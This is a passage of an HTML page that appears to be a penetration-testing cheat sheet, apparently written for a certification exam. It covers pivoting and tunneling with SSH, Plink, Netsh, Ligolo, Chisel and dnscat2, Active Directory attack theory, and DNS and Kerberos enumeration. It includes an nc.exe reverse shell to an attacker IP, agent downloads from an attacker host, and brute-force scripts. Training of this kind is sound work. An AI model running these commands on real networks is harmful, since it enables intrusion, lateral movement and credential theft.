              <pre><code class="language-bash"># /etc/proxychains4.conf
[ProxyList]
socks5 127.0.0.1 [local_socks_proxy_port]
</code></pre>
              <ol start="3">
                <li>Run commands pre-adding <code>proxychains</code></li>
              </ol>
              <pre><code class="language-bash"># For example
proxychains smbclient -L //internal_ip/ -U username --password=password
</code></pre>
              <h3 id="94-ssh-remote-port-forwarding">9.4 SSH Remote Port Forwarding</h3>
              <pre><code class="language-bash">ssh -N -R 127.0.0.1:[remote_port_on_ssh_host]:[internal_target_ip]:[internal_target_port] username@remote_host
</code></pre>
              <h3 id="95-ssh-remote-dynamic-port-forwarding">9.5 SSH Remote Dynamic Port Forwarding</h3>
              <ol>
                <li>Setting up the Remote Dynamic Port Forwarding</li>
              </ol>
              <pre><code class="language-bash">ssh -N -R [proxychains_port] username@remote_host
</code></pre>
              <ol start="2">
                <li>Configure the Proxychains</li>
              </ol>
              <pre><code class="language-bash"># /etc/proxychains4.conf
[ProxyList]
socks5 127.0.0.1 [proxychains_port]
</code></pre>
              <h3 id="96-ssh-windows">9.6 SSH (Windows)</h3>
              <ol>
                <li>Find SSH Location and Version</li>
              </ol>
              <pre><code class="language-powershell">where ssh
ssh.exe -V
</code></pre>
              <ol start="2">
                <li>Connect to a Remote Machine with Dynamic Port Forwarding</li>
              </ol>
              <pre><code class="language-powershell">ssh -N -R [REMOTE_PORT]:localhost:[LOCAL_PORT] [USER]@[REMOTE_HOST]
</code></pre>
              <ol start="3">
                <li>Configure Proxychains on Kali</li>
              </ol>
              <pre><code class="language-bash"># Edit /etc/proxychains4.conf and add
[ProxyList]
socks5 127.0.0.1 [REMOTE_PORT]
</code></pre>
              <ol start="4">
                <li>Check Open SOCKS Port on Kali</li>
              </ol>
              <pre><code class="language-bash">ss -ntplu
</code></pre>
              <h3 id="97-plink-windows">9.7 Plink (Windows)</h3>
              <ol>
                <li>Start Apache Server on Kali</li>
              </ol>
              <pre><code class="language-bash">sudo systemctl start apache2
</code></pre>
              <ol start="2">
                <li>Copy <code>nc.exe</code> to Apache Webroot</li>
              </ol>
              <pre><code class="language-bash">find / -name nc.exe 2&gt;/dev/null
sudo cp [SOURCE_PATH]/nc.exe /var/www/html/
</code></pre>
              <ol start="3">
                <li>Download <code>nc.exe</code> on Target Using PowerShell</li>
              </ol>
              <pre><code class="language-powershell">wget -Uri http://[KALI_IP]/nc.exe -OutFile C:\Windows\Temp\nc.exe
</code></pre>
              <ol start="4">
                <li>Execute <code>nc.exe</code> Reverse Shell on Target</li>
              </ol>
              <pre><code class="language-powershell">C:\Windows\Temp\nc.exe -e cmd.exe [KALI_IP] [PORT]
</code></pre>
              <ol start="5">
                <li>Copy <code>plink.exe</code> to Apache Webroot</li>
              </ol>
              <pre><code class="language-bash">find / -name plink.exe 2&gt;/dev/null
sudo cp [SOURCE_PATH]/plink.exe /var/www/html/
</code></pre>
              <ol start="6">
                <li>Download <code>plink.exe</code> on Target Using PowerShell</li>
              </ol>
              <pre><code class="language-powershell">wget -Uri http://[KALI_IP]/plink.exe -OutFile C:\Windows\Temp\plink.exe
</code></pre>
              <ol start="7">
                <li>Create an SSH Connection Using Plink</li>
              </ol>
              <pre><code class="language-powershell">cmd.exe /c echo y | C:\Windows\Temp\plink.exe -ssh -l [USER] -pw [PASSWORD] -R [LOCAL_PORT]:127.0.0.1:[REMOTE_PORT] [KALI_IP]
</code></pre>
              <ol start="8">
                <li>Connect to RDP Server Using <code>xfreerdp</code></li>
              </ol>
              <pre><code class="language-bash">xfreerdp /u:[USERNAME] /p:[PASSWORD] /v:127.0.0.1:[LOCAL_PORT]
</code></pre>
              <h3 id="98-netsh-windows">9.8 Netsh (Windows)</h3>
              <ol>
                <li>Set Up Port Forwarding with <code>Netsh</code></li>
              </ol>
              <pre><code class="language-powershell">netsh interface portproxy add v4tov4 listenport=[LISTEN_PORT] listenaddress=[LISTEN_IP] connectport=[CONNECT_PORT] connectaddress=[CONNECT_IP]
</code></pre>
              <ol start="2">
                <li>Verify Listening Port</li>
              </ol>
              <pre><code class="language-powershell">netstat -anp TCP | find &quot;[LISTEN_PORT]&quot;
</code></pre>
              <ol start="3">
                <li>List Port Forwarding Rules</li>
              </ol>
              <pre><code class="language-powershell">netsh interface portproxy show all
</code></pre>
              <ol start="4">
                <li>Add Firewall Rule to Allow Port</li>
              </ol>
              <pre><code class="language-powershell">netsh advfirewall firewall add rule name=&quot;[RULE_NAME]&quot; protocol=TCP dir=in localip=[LISTEN_IP] localport=[LISTEN_PORT] action=allow
</code></pre>
              <ol start="5">
                <li>Connect Using SSH</li>
              </ol>
              <pre><code class="language-bash">ssh [USER]@[LISTEN_IP] -p[LISTEN_PORT]
</code></pre>
              <ol start="6">
                <li>Delete Firewall Rule</li>
              </ol>
              <pre><code class="language-powershell">netsh advfirewall firewall delete rule name=&quot;[RULE_NAME]&quot;
</code></pre>
              <ol start="7">
                <li>Remove Port Forwarding Rule</li>
              </ol>
              <pre><code class="language-powershell">netsh interface portproxy del v4tov4 listenport=[LISTEN_PORT] listenaddress=[LISTEN_IP]
</code></pre>
              <h2 id="10-tunneling-through-tools">10. <span class="emoji">‚õìÔ∏è</span> Tunneling Through Tools</h2>
              <h3 id="101-ligolo-direct-subnetting">10.1 Ligolo (Direct Subnetting)</h3>
              <h4 id="1011-normal-tunneling">10.1.1 Normal Tunneling</h4>
              <p>Keep in mind that we should have already downloaded the proxy to our attacker machine, and have
                transfer the agent to the victim.</p>
              <div class="col-lg text-center" data-aos="fade-up">
                <figure class="figure">
                  <img src="img/ligolo_tunnel.png" class="img-fluid" alt="Descripci√≥n de la imagen">
                  <figcaption class="figure-caption text-center">Ligolo Tunneling</figcaption>
                </figure>
              </div>
              <ol>
                <li>
                  <p><strong>Find the network mask</strong>, for example, if your IP address is <code>X.X.X.X</code> and
                    the subnet mask is <code>Y.Y.Y.Y</code>, the network will be <code>X.X.X.X/</code> followed by the
                    subnet prefix. For instance, with a subnet mask of <code>255.255.255.0</code>, the network prefix
                    would be <code>/24</code>.</p>
                </li>
                <li>
                  <p><strong>Create the interface</strong> for <code>ligolo</code> in my Kali</p>
                </li>
              </ol>
              <pre><code class="language-bash">sudo ip tuntap add user [kali_user] mode tun ligolo

sudo ip link set ligolo up
</code></pre>
              <ol start="3">
                <li><strong>Enable the proxy server</strong> on the attacker machine</li>
              </ol>
              <pre><code class="language-bash"># The option -selfcert is for not using a certificate (this will make our communications in clear text), we do not need to encrypt them for the exam.
./ligolo_proxy_linux -selfcert
or
./ligolo_proxy_linux -selfcert -port &lt;DIFFERENT_PROXY_PORT&gt;
</code></pre>
              <ol start="4">
                <li>Download <strong>(bring) the agent</strong> program to the victim (in this example Windows)</li>
              </ol>
              <pre><code class="language-powershell">iwr -uri http://[attacker_ip]/ligolo_agent_windows.exe -UseBasicParsing -Outfile ligolo_agent_windows.exe
</code></pre>
              <ol start="5">
                <li><strong>Start the client</strong></li>
              </ol>
              <pre><code class="language-powershell"># The port is the default one, we could also change it if needed.
./ligolo_agent_windows.exe -connect [attacker_ip]:11601 -ignore-cert
or
./ligolo_agent_windows.exe -connect [attacker_ip]:&lt;DIFFERENT_PROXY_PORT&gt; -ignore-cert
</code></pre>
              <ol start="6">
                <li><strong>Add the route</strong> in the Kali</li>
              </ol>
              <pre><code class="language-bash"># Run this command in other terminal that from the one where ligolo proxy is running
sudo ip route add [internal_submask]/24 dev ligolo

# Verify routing table
ip route list
</code></pre>
              <ol start="7">
                <li><strong>Finish</strong> setting up the tunneling session</li>
              </ol>
              <pre><code class="language-bash"># Run this commands in the ligolo proxy terminal
¬ª session
¬ª start

# After this the tunneling should be ready, you could perform any command.
</code></pre>
              <h4 id="1012-double-tunneling">10.1.2 Double Tunneling</h4>
              <p>In certain cases, the recently compromised host will have two interfaces, enabling you to explore the
                network further and find more hosts. In this scenario, you&#39;ll need to execute a double pivot.</p>
              <div class="col-lg text-center" data-aos="fade-up">
                <figure class="figure">
                  <img src="img/ligolo_double_tunnel.png" class="img-fluid" alt="Descripci√≥n de la imagen">
                  <figcaption class="figure-caption text-center">Ligolo Double Tunneling</figcaption>
                </figure>
              </div>
              <ol>
                <li>Add a second interface</li>
              </ol>
              <pre><code class="language-bash">sudo ip tuntap add user [kali_user] mode tun ligolo_double

sudo ip link set ligolo_double up
</code></pre>
              <ol start="2">
                <li>Create a listener</li>
              </ol>
              <pre><code class="language-bash"># The next step is to add a listener on port 11601 to our existing Ligolo session and redirect it to our machine. 
listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp

# Verify it&rsquo;s been added
listener_list
</code></pre>
              <div class="col-lg text-center" data-aos="fade-up">
                <figure class="figure">
                  <img src="img/ligolo_01.png" class="img-fluid" alt="Descripci√≥n de la imagen">
                  <figcaption class="figure-caption text-center">Ligolo creating a listener</figcaption>
                </figure>
              </div>
              <ol start="3">
                <li>Connect to the proxy server</li>
              </ol>
              <pre><code class="language-powershell"># Next, we need to execute the agent on the Windows host to connect to the forwarded port on our attacker machine
./agent.exe -connect &lt;IP of First Pivot Point&gt;:11601 -ignore-cert
</code></pre>
              <div class="col-lg text-center" data-aos="fade-up">
                <figure class="figure">
                  <img src="img/ligolo_02.png" class="img-fluid" alt="Descripci√≥n de la imagen">
                  <figcaption class="figure-caption text-center">Ligolo connecting to the proxy server</figcaption>
                </figure>
              </div>
              <ol start="4">
                <li>
                  <p>Verify the connection on Kali by checking if the Windows agent has connected via the forwarded
                    port.</p>
                  <div class="col-lg text-center" data-aos="fade-up">
                    <figure class="figure">
                      <img src="img/ligolo_03.png" class="img-fluid" alt="Descripci√≥n de la imagen">
                      <figcaption class="figure-caption text-center">Ligolo client connected</figcaption>
                    </figure>
                  </div>
                </li>
                <li>
                  <p>Start a tunnel and add a route</p>
                </li>
              </ol>
              <pre><code class="language-bash"># Our last step is to change our session to the second pivot point (Windows), start the tunnel, and then add a route to the newly discovered network at 10.1.30.0/24.
sudo ip add route &lt;New_Network&gt; dev ligolo_double
</code></pre>
              <p>We&rsquo;ll be able to interact with the new network from our Kali machine and run all the same tools
                as we
                did with the single pivot.</p>
              <div class="col-lg text-center" data-aos="fade-up">
                <figure class="figure">
                  <img src="img/ligolo_04.png" class="img-fluid" alt="Descripci√≥n de la imagen">
                  <figcaption class="figure-caption text-center">Ligolo sessions configured</figcaption>
                </figure>
              </div>
              <div class="col-lg text-center" data-aos="fade-up">
                <figure class="figure">
                  <img src="img/ligolo_05.png" class="img-fluid" alt="Descripci√≥n de la imagen">
                  <figcaption class="figure-caption text-center">Ligolo interface configured</figcaption>
                </figure>
              </div>
              <p>You could continue with a triple pivot using Ligolo, following the same steps as we did with the
                double pivot.</p>
              <div class="col-lg text-center" data-aos="fade-up">
                <figure class="figure">
                  <img src="img/ligolo_06.png" class="img-fluid" alt="Descripci√≥n de la imagen">
                  <figcaption class="figure-caption text-center">Reaching internal network via ligolo</figcaption>
                </figure>
              </div>
              <h4 id="1013-local-port-forwarding">10.1.3 Local Port Forwarding</h4>
              <p>Local port forwarding is useful when you encounter an internal server on the victim machine that only
                accepts connections from the local machine. By using a <strong>special hardcoded IP address</strong>,
                <code>Ligolo-ng</code> facilitates this process; to set up local port forwarding, <strong>follow these
                  steps</strong>:
              </p>
              <ol>
                <li>
                  <p><strong>Ensure Tunneling is Configured</strong>: make sure you have already established the
                    tunneling with <code>Ligolo-ng</code> and that your network interface is set up correctly as
                    <code>ligolo</code>.
                  </p>
                </li>
                <li>
                  <p><strong>Add the Special IP Address</strong>: use the following command to add a special IP address
                    that <code>Ligolo-ng</code> recognizes as the local endpoint for port forwarding.</p>
                </li>
              </ol>
              <pre><code class="language-bash"># Add a special hardcoded IP for local port forwarding.
sudo ip route add 240.0.0.1/32 dev ligolo
</code></pre>
              <p><strong>Explanation</strong></p>
              <ul>
                <li><strong><code>240.0.0.1/32</code></strong>: this is a special hardcoded IP address that
                  <code>Ligolo-ng</code> understands; by adding this route, you inform the system to route traffic
                  intended for this IP through the <code>ligolo</code> interface to the victim machine where the client
                  is running.
                </li>
                <li><strong><code>dev ligolo</code></strong>: this specifies the device (or network interface) through
                  which the routing will occur, ensuring that all traffic directed to <code>240.0.0.1</code> is
                  channeled through the established tunnel.</li>
              </ul>
              <p><strong>Examples</strong>: just with that command we can now connect to the internal services of the
                victim machine, either by using commands or other types of services like HTTP.</p>
              <pre><code class="language-bash">‚îå‚îÄ‚îÄ(kali„âøKali)-[~]  
‚îî‚îÄ$ nmap 240.0.0.1 -sV

PORT STATE SERVICE VERSION  
22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)  
80/tcp open http Apache httpd 2.4.29 ((Ubuntu))  
631/tcp open ipp CUPS 2.2  
3306/tcp open mysql MySQL 5.7.29-0ubuntu0.18.04.1  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre>
              <div class="col-lg text-center" data-aos="fade-up">
                <figure class="figure">
                  <img src="img/ligolo_port_forwarding.png" class="img-fluid" alt="Descripci√≥n de la imagen">
                  <figcaption class="figure-caption text-center">Ligolo local port forwarding</figcaption>
                </figure>
              </div>
              <h4 id="1014-reverse-shells-from-internal-networks">10.1.4 Reverse Shells From Internal Networks</h4>
              <ol>
                <li>Setup the Netcat listener in our Kali</li>
              </ol>
              <pre><code class="language-bash">nc -nvlp [kali_port]
</code></pre>
              <ol start="2">
                <li>Setup a listener for the reverse shell in the Ligolo session</li>
              </ol>
              <pre><code class="language-bash">listener_add --addr 0.0.0.0:[agent_port] --to 127.0.0.1:[kali_port] --tcp
</code></pre>
              <div class="col-lg text-center" data-aos="fade-up">
                <figure class="figure">
                  <img src="img/ligolo_10.png" class="img-fluid" alt="Descripci√≥n de la imagen">
                  <figcaption class="figure-caption text-center">Ligolo setting up listener for reverse shell
                  </figcaption>
                </figure>
              </div>
              <ol start="3">
                <li>Run a reverse shell command or a payload created with <code>msfvenom</code></li>
              </ol>
              <pre><code class="language-bash">[command_to_run_reverse_shell] -L [kali_ip]:[kali_port]
or
./payload.exe
</code></pre>
              <div class="col-lg text-center" data-aos="fade-up">
                <figure class="figure">
                  <img src="img/ligolo_11.png" class="img-fluid" alt="Descripci√≥n de la imagen">
                  <figcaption class="figure-caption text-center">Executing payload from internal network</figcaption>
                </figure>
              </div>
              <h4 id="1015-file-transfers-from-internal-networks">10.1.4 File Transfers From Internal Networks</h4>
              <ol>
                <li>Setup a listener in the Ligolo session</li>
              </ol>
              <pre><code class="language-bash">listener_add --addr 0.0.0.0:[agent_port] --to 127.0.0.1:[kali_port] --tcp
</code></pre>
              <div class="col-lg text-center" data-aos="fade-up">
                <figure class="figure">
                  <img src="img/ligolo_07.png" class="img-fluid" alt="Descripci√≥n de la imagen">
                  <figcaption class="figure-caption text-center">Ligolo setting up listener for incoming files requests
                  </figcaption>
                </figure>
              </div>
              <ol start="2">
                <li>Host the file in our Kali</li>
              </ol>
              <pre><code class="language-bash">python3 -m http.server [kali_port]
</code></pre>
              <div class="col-lg text-center" data-aos="fade-up">
                <figure class="figure">
                  <img src="img/ligolo_08.png" class="img-fluid" alt="Descripci√≥n de la imagen">
                  <figcaption class="figure-caption text-center">Local HTTP Server running in our Kali</figcaption>
                </figure>
              </div>
              <ol start="3">
                <li>Download the file on the compromised Windows host</li>
              </ol>
              <pre><code class="language-powershell">Invoke-WebRequest -Uri &quot;http://[agent_ip]:[agent_port]/[file_name]&quot; -OutFile [file_name]
</code></pre>
              <div class="col-lg text-center" data-aos="fade-up">
                <figure class="figure">
                  <img src="img/ligolo_09.png" class="img-fluid" alt="Descripci√≥n de la imagen">
                  <figcaption class="figure-caption text-center">Downloading file to the internal network</figcaption>
                </figure>
              </div>
              <h3 id="102-chisel-http-tunneling">10.2 Chisel (HTTP Tunneling)</h3>
              <p>Remember to first transfer the client program to the victim, you can find the programs and guide on how
                to transfer files in the Section 18.</p>
              <h4 id="1021-port-forwarding">10.2.1 Port Forwarding</h4>
              <pre><code class="language-bash"># In remote machine
chisel server -p &lt;listen-port&gt;

# In local machine
chisel client &lt;listen-ip&gt;:&lt;listen-port&gt; &lt;local-port&gt;:&lt;target-ip&gt;:&lt;target-port&gt;
</code></pre>
              <h4 id="1022-reverse-port-forwarding">10.2.2 Reverse Port Forwarding</h4>
              <p>It is useful when we want to access to the host and the port that cannot be directly accessible from
                local machine.</p>
              <ol>
                <li>Create the forwarding</li>
              </ol>
              <pre><code class="language-bash"># In local machine
chisel server -p &lt;LOCAL_PORT&gt; --reverse

# In remote machine
chisel client &lt;LOCAL_IP&gt;:&lt;LOCAL_PORT&gt; R:&lt;LOCAL_FORWARD_PORT&gt;:&lt;REMOTE_IP&gt;:&lt;REMOTE_PORT&gt;

# Replace &lt;LOCAL_PORT&gt; with the port you want Chisel to listen on locally, &lt;LOCAL_IP&gt; with the IP address of your local machine, &lt;LOCAL_FORWARD_PORT&gt; with the port on your local machine to which the remote service will be forwarded, &lt;REMOTE_IP&gt; with the IP address of the remote machine, and &lt;REMOTE_PORT&gt; with the port on the remote machine.
</code></pre>
              <ol start="2">
                <li>Access the forwarded service</li>
              </ol>
              <pre><code class="language-bash">curl http://localhost:&lt;LOCAL_FORWARD_PORT&gt;

# The result is the content from http://&lt;REMOTE_IP&gt;:&lt;REMOTE_PORT&gt;/
</code></pre>
              <h4 id="1023-forward-dynamic-socks-proxy">10.2.3 Forward Dynamic SOCKS Proxy</h4>
              <ol>
                <li>Create the forwarding</li>
              </ol>
              <pre><code class="language-bash"># In remote
chisel server -p &lt;REMOTE_PORT&gt; --socks5

# In local
chisel client &lt;REMOTE_IP&gt;:&lt;REMOTE_PORT&gt; &lt;LOCAL_PORT&gt;:socks

# Replace &lt;REMOTE_PORT&gt; with the port for the SOCKS proxy on the remote machine, &lt;REMOTE_IP&gt; with the IP address of the remote machine, and &lt;LOCAL_PORT&gt; with the port on your local machine where the SOCKS proxy will be available.
</code></pre>
              <ol start="2">
                <li>Then modify <code>/etc/proxychains.conf</code> in local machine</li>
              </ol>
              <pre><code class="language-bash"># Comment out the line of &quot;socks4&quot;

# /etc/proxychains.conf
...
socks5 127.0.0.1 &lt;LOCAL_PORT&gt;
</code></pre>
              <h4 id="1024-reverse-dynamic-socks-proxy">10.2.4 Reverse Dynamic SOCKS Proxy</h4>
              <p>It is useful when we want to access to the host &amp; multiple ports that cannot be directly accessible
                from local machine.</p>
              <ol>
                <li>Create the forwarding</li>
              </ol>
              <pre><code class="language-bash"># In local machine
chisel server -p &lt;LOCAL_PORT&gt; --reverse

# In remote machine
chisel client &lt;LOCAL_IP&gt;:&lt;LOCAL_PORT&gt; R:&lt;REMOTE_PORT&gt;:socks

# Replace &lt;LOCAL_PORT&gt; with the port you want Chisel to listen on locally, &lt;LOCAL_IP&gt; with the IP address of your local machine, and &lt;REMOTE_PORT&gt; with the port on the remote machine where the SOCKS proxy will be available.
</code></pre>
              <ol start="2">
                <li>Then modify <code>/etc/proxychains.conf</code> in local machine</li>
              </ol>
              <pre><code class="language-bash"># /etc/proxychains.conf
...
socks5 127.0.0.1 &lt;REMOTE_PORT&gt;
</code></pre>
              <ol start="3">
                <li>Confirm that we can access the desired host and port with <code>proxychains</code></li>
              </ol>
              <pre><code class="language-bash">proxychains nmap localhost
</code></pre>
              <h3 id="103-dnscat2-dns-tunneling">10.3 Dnscat2 (DNS Tunneling)</h3>
              <ol>
                <li>Start the <code>dnscat2</code> server</li>
              </ol>
              <pre><code class="language-bash"># Replace [domain] with the chosen domain
dnscat2-server [domain]
</code></pre>
              <ol start="2">
                <li>Start the <code>dnscat2</code> client</li>
              </ol>
              <pre><code class="language-bash"># With domain
./dnscat --secret=[secret] [domain]

# Directly to server
./dnscat --dns server=[attacker_ip],port=53 --secret=[secret]
</code></pre>
              <ol start="3">
                <li>Interact with the <code>dnscat2</code> client from the server</li>
              </ol>
              <pre><code class="language-bash">dnscat2&gt; windows
dnscat2&gt; window -i [session_id]
</code></pre>
              <ol start="4">
                <li>Setting up a port forwarding in <code>dnscat2</code></li>
              </ol>
              <pre><code class="language-bash">command ([session_name]) &gt; listen 127.0.0.1:[local_port] [target_ip]:[target_port]
</code></pre>
              <ol start="5">
                <li>Connecting to a service through the <code>dnscat2</code> port forward</li>
              </ol>
              <pre><code class="language-bash"># Example command
smbclient -p [local_port] -L //127.0.0.1 -U [username] --password=[password]
</code></pre>
              <h2 id="11-active-directory-theory">11. <span class="emoji">üìú</span> Active Directory Theory</h2>
              <h3 id="111-overview">11.1 Overview</h3>
              <ul>
                <li>Active Directory (AD) manages objects (e.g., computers, users) in a domain, such as
                  <code>domain.com</code>, and organizes them into <strong>Organizational Units (OUs)</strong>.
                </li>
                <li><strong>Domain Controllers (DCs)</strong> store all the password hashes for domain users.</li>
                <li>To control AD fully, target the <strong>Domain Admins group</strong> or a <strong>Domain
                    Controller</strong>.</li>
                <li>Services like Exchange or IIS integrate with AD using <strong>Service Principal Names
                    (SPNs)</strong>, which identify services and link them to service accounts.</li>
                <li><strong>Kerberos</strong> is used to authenticate users and services using tickets,
                  and if I have an user&#39;s ticket I can impersonate that user.</li>
              </ul>
              <h3 id="112-authentication">11.2 Authentication</h3>
              <ul>
                <li><strong>NTLM</strong>: Uses a challenge/response protocol to authenticate users without transmitting
                  passwords.</li>
                <li><strong>Kerberos</strong>: Relies on a <strong>Key Distribution Center (KDC)</strong> to issue
                  <strong>Ticket Granting Tickets (TGTs)</strong> and <strong>Service Tickets (TGSs)</strong> for user
                  authentication.
                </li>
                <li><strong>TGT</strong>: Provides authentication validity for up to 10 hours, and a session key for
                  accessing domain resources.</li>
                <li><strong>TGS</strong>: Allows users to access services using SPNs, with permissions granted based on
                  group membership.</li>
              </ul>
              <h3 id="113-credential-storage--hash-dumping">11.3 Credential Storage &amp; Hash Dumping</h3>
              <ul>
                <li><strong>LSASS</strong> stores password hashes for single sign-on (SSO). With admin access, tools
                  like <strong>Mimikatz</strong> can dump:<ul>
                    <li>Password hashes.</li>
                    <li><strong>TGTs</strong> and <strong>TGSs</strong> (for Kerberoasting or forgery).</li>
                  </ul>
                </li>
                <li><strong>Kerberoasting</strong>: Crack the service account&rsquo;s password hash from TGS tickets to
                  reveal
                  the clear-text password.</li>
                <li><strong>Silver/Golden Tickets</strong>: Forging TGS tickets using cracked SPN password hashes to
                  impersonate users.</li>
              </ul>
              <h3 id="114-common-attack-vectors">11.4 Common Attack Vectors</h3>
              <ul>
                <li><strong>AS-REP Roasting</strong>: Target accounts without <strong>Kerberos
                    Pre-Authentication</strong> (indicated by the <code>DONT_REQ_PREAUTH</code> flag), extract AS-REP
                  responses, and attempt to crack the encrypted part offline.</li>
                <li><strong>Kerberoasting</strong>: Target SPNs, extract TGS tickets, crack the passwords offline.</li>
                <li><strong>Pass-the-Hash (PtH)</strong>: Reuse NTLM hashes to authenticate to services without cracking
                  the password.</li>
                <li><strong>Pass-the-Ticket (PtT)</strong>: Use stolen Kerberos tickets to move laterally or maintain
                  persistence.</li>
                <li><strong>Silver Ticket</strong>: Enables attackers to forge a TGS ticket for a specific
                  service using the NTLM hash of the service account. This allows unauthorized access to that service
                  without needing user credentials.</li>
                <li><strong>Golden Ticket</strong>: Allows attackers to forge a TGT using the KRBTGT account
                  hash, enabling them to impersonate any user in the domain, including privileged accounts, and gain
                  extensive access across the network.</li>
                <li><strong>Kerberos Delegation Abuse</strong>:<ul>
                    <li><strong>Unconstrained Delegation</strong>: Allows attackers to impersonate any user, including
                      privileged ones, by using a high-privileged TGT.</li>
                    <li><strong>Constrained Delegation</strong>: Allows impersonation of specific users for services
                      where delegation has been configured; so restricts the impersonation capabilities to specific
                      services.</li>
                  </ul>
                </li>
                <li><strong>DC Sync</strong>: Allows attackers with certain privileges (e.g., <em>Replicating Directory
                    Changes</em>) to impersonate a Domain Controller and request <strong>password hashes,</strong>
                  including <strong>NTLM</strong> hashes, from the AD; the user needs the permissions
                  <code>DC-Replication-Get-Changes</code> along with the privilege <em>GetChangesAll</em>.
                </li>
              </ul>
              <h3 id="115-lateral-movement">11.5 Lateral Movement</h3>
              <ul>
                <li><strong>Pass the Hash (PtH)</strong>: Use NTLM hashes to authenticate to remote systems without
                  needing the plaintext password.</li>
                <li><strong>Overpass the Hash</strong>: Use an NTLM hash to request a TGT for Kerberos-based services,
                  enabling domain-wide movement without the need for the actual password.</li>
              </ul>
              <h3 id="116-persistence">11.6 Persistence</h3>
              <ul>
                <li><strong>Golden Ticket Attack</strong>: By obtaining the <strong>krbtgt</strong> password hash, an
                  attacker can forge <strong>TGTs</strong> and impersonate any user.</li>
                <li><strong>DCSync Attack</strong>: Request replication updates from DCs to retrieve password hashes of
                  every AD user.</li>
              </ul>
              <h2 id="12-active-directory-enumeration">12. <span class="emoji">üïµÔ∏è‚Äç‚ôÇÔ∏è</span> Active Directory
                Enumeration</h2>
              <h3 id="121-initial-recon-with-nmap">12.1 Initial Recon with Nmap</h3>
              <p>Start by scanning the target with Nmap to identify potential services and domain controllers (DC):</p>
              <pre><code class="language-bash">nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49152-65535 -sS -sV -oA ad-enum &lt;target-ip&gt;
</code></pre>
              <p><strong>Common Active Directory ports</strong>:</p>
              <ul>
                <li><strong>53</strong>: DNS</li>
                <li><strong>88</strong>: Kerberos</li>
                <li><strong>135</strong>: RPC</li>
                <li><strong>139/445</strong>: SMB</li>
                <li><strong>389/636</strong>: LDAP/LDAPS</li>
                <li><strong>464</strong>: Kerberos Password Change</li>
                <li><strong>5985</strong>: WinRM</li>
              </ul>
              <p><strong>Recommended Strategy</strong>:</p>
              <ol>
                <li><strong>Perform LDAP Search</strong>: retrieve potential user and password information.</li>
              </ol>
              <pre><code class="language-bash">ldapsearch -x -H ldap://&lt;dc-ip&gt; -b &quot;dc=domain,dc=com&quot;
</code></pre>
              <ol start="2">
                <li><strong>Enumerate DNS</strong>: gather information about key servers within the domain.</li>
              </ol>
              <pre><code class="language-bash">gobuster dns -d domain.com -t 25 -w /us/share/wordlists/Seclist/Discovery/DNS/subdomain-top2000.txt
</code></pre>
              <ol start="3">
                <li>
                  <p><strong>Check SMB Shares:</strong> see Section 1.4.11.</p>
                </li>
                <li>
                  <p><strong>Enumerate LDAP Services</strong>:</p>
                </li>
              </ol>
              <pre><code class="language-bash">nmap -n -sV --script &quot;ldap* and not brute&quot; -p 389 &lt;dc-ip&gt;
</code></pre>
              <ol start="5">
                <li><strong>Find Valid Users</strong>:</li>
              </ol>
              <pre><code class="language-bash"># Using Kerbrute
./kerbrute_linux_amd64 userenum -d [domain].com /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames

# Using CrackMapExec
crackmapexec smb [domain].com -u &#39;&#39; -p &#39;&#39; --users
</code></pre>
              <ol start="6">
                <li><strong>Enumerate All AD Users</strong>: this has to be done after having valid credentials.</li>
              </ol>
              <pre><code class="language-bash"># Using GetAdUsers.py (same tool)
impacket-GetADUsers -all -dc-ip &lt;dc_ip&gt; -u &lt;username&gt; -p &lt;password&gt; &lt;domain&gt;

# Using Enum4Linux
enum4linux -a -u &quot;&lt;username&gt;&quot; -p &quot;&lt;password&gt;&quot; &lt;dc_ip&gt;
</code></pre>
              <h4 id="1211-dns-enumeration-port-53">12.1.1 DNS Enumeration (Port 53)</h4>
              <p><strong>Nmap Scripting Scan</strong></p>
              <pre><code class="language-bash">nmap --script dns-brute,dns-nsid,dns-recursion,dns-zone-transfer -p 53 &lt;target_ip&gt;
</code></pre>
              <p><strong>Enumerating AD Domain via DNS</strong></p>
              <pre><code class="language-bash">nmap -p 53 --script &quot;dns-nsid,dns-srv-enum&quot; &lt;target_ip&gt;
</code></pre>
              <p><strong>Zone Transfer</strong>: test for DNS zone transfer to retrieve a list of domain records.</p>
              <pre><code class="language-bash">dig axfr @&lt;dc-ip&gt; &lt;domain&gt;
</code></pre>
              <p><strong>DNS Record Lookup</strong>: query specific domain records, such as domain controllers and mail
                servers.</p>
              <pre><code class="language-bash">dig A &lt;domain&gt; @&lt;dc-ip&gt;
dig SRV _ldap._tcp.dc._msdcs.&lt;domain&gt; @&lt;dc-ip&gt;
</code></pre>
              <p><strong>Basic DNS Enumeration</strong></p>
              <pre><code class="language-bash">dig axfr &lt;domain_name&gt; @&lt;dns_server_ip&gt;  # Attempt zone transfer
dig ANY &lt;domain_name&gt; @&lt;dns_server_ip&gt;  # Retrieve all records
nslookup
&gt; server &lt;dns_server_ip&gt;
&gt; set type=any
&gt; &lt;domain_name&gt;  # Query any records
</code></pre>
              <p><strong>Zone Transfer</strong></p>
              <pre><code class="language-bash">dnsrecon -d &lt;domain_name&gt; -n &lt;dns_server_ip&gt; -t axfr

dnsenum --enum -f /usr/share/dnsenum/dns.txt --dnsserver &lt;dns_server_ip&gt; &lt;domain_name&gt;
</code></pre>
              <p><strong>Reverse Lookup</strong></p>
              <pre><code class="language-bash">nmap -sL &lt;target_ip_range&gt; | grep &quot;Nmap scan report&quot;  # Reverse DNS lookup for a range
</code></pre>
              <p><strong>DNS Cache Snooping</strong></p>
              <pre><code class="language-bash">dig @&lt;dns_server_ip&gt; -t A +norecurse &lt;target_domain&gt;
</code></pre>
              <p><strong>Enumerate DNS with PowerShell (Windows)</strong></p>
              <pre><code class="language-powershell">Resolve-DnsName -Name &lt;domain_name&gt; -Server &lt;dns_server_ip&gt; -DnsOnly
</code></pre>
              <h4 id="1212-kerberos-enumeration-port-88">12.1.2 Kerberos Enumeration (Port 88)</h4>
              <p><strong>Nmap Scripting Scan</strong></p>
              <pre><code class="language-bash"># Check for Kerberos service availability and get basic information
nmap -p 88 --script kerberos-enum-users &lt;target_ip&gt;

# Check for common Kerberos vulnerabilities
nmap -p 88 --script kerberos-brute &lt;target_ip&gt;

